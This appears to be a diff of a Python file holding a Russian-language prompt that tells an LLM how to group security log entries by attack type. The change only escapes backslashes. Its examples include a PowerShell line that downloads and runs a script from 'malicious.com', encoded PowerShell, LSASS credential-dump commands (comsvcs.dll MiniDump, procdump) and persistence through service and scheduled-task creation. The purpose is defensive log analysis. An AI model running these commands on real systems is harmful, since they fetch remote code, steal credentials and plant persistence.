@@ -33,7 +33,7 @@ PRIMARY_ANALYSIS_USER_PROMPT_V2 = """Проанализируй следующи
 ❌ ПЛОХО (смешивание разных типов атак в одной группе):
   - "89.23.74.19 - - [10/Jan/2026:13:06:06] \"POST /login HTTP/1.1\" 401" (брутфорс)
   - "powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0AT..." (выполнение команд)
-  - "rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 1234 lsass.dmp" (дамп LSASS)
+  - "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 1234 lsass.dmp" (дамп LSASS)
   → Это три РАЗНЫЕ атаки, их НЕЛЬЗЯ в одну группу. Создай отдельные группы для каждого типа.
 
 ✅ ХОРОШО (группировка по IP и паттерну):
@@ -48,26 +48,26 @@ PRIMARY_ANALYSIS_USER_PROMPT_V2 = """Проанализируй следующи
   → Группа: попытка инжекции через LD_PRELOAD
 
 ✅ ХОРОШО (группировка по командам PowerShell):
-  - "powershell -ExecutionPolicy Bypass -File C:\Users\admin\payload.ps1"
+  - "powershell -ExecutionPolicy Bypass -File C:\\Users\\admin\\payload.ps1"
   - "powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0AT..."
   - "powershell IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/script.ps1')"
   → Группа: выполнение PowerShell с обфускацией/скачиванием скрипта
 
 ✅ ХОРОШО (группировка по созданию служб):
-  - "sc.exe create UpdateService binPath= C:\Windows\Temp\update.exe start= auto"
+  - "sc.exe create UpdateService binPath= C:\\Windows\\Temp\\update.exe start= auto"
   - "sc.exe start UpdateService"
-  - "New-Service -Name UpdateService -BinaryPathName C:\Windows\Temp\update.exe"
+  - "New-Service -Name UpdateService -BinaryPathName C:\\Windows\\Temp\\update.exe"
   → Группа: создание и запуск подозрительной службы для персистенции
 
 ✅ ХОРОШО (группировка по планировщику задач):
-  - "schtasks /create /tn 'UpdateTask' /tr C:\Windows\Temp\update.exe /sc daily /st 09:00"
+  - "schtasks /create /tn 'UpdateTask' /tr C:\\Windows\\Temp\\update.exe /sc daily /st 09:00"
   - "schtasks /run /tn 'UpdateTask'"
   → Группа: создание задачи в планировщике для персистенции
 
 ✅ ХОРОШО (группировка по дампу LSASS):
-  - "rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 1234 lsass.dmp full"
+  - "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 1234 lsass.dmp full"
   - "procdump.exe -ma lsass.exe lsass.dmp"
-  - "C:\Windows\System32\Taskmgr.exe /dump 1234 lsass.dmp"
+  - "C:\\Windows\\System32\\Taskmgr.exe /dump 1234 lsass.dmp"
   → Группа: попытка дампа LSASS для кражи учётных данных
   
 ⚠️ КОНТЕКСТНАЯ ОЦЕНКА (не игнорируй, а анализируй):
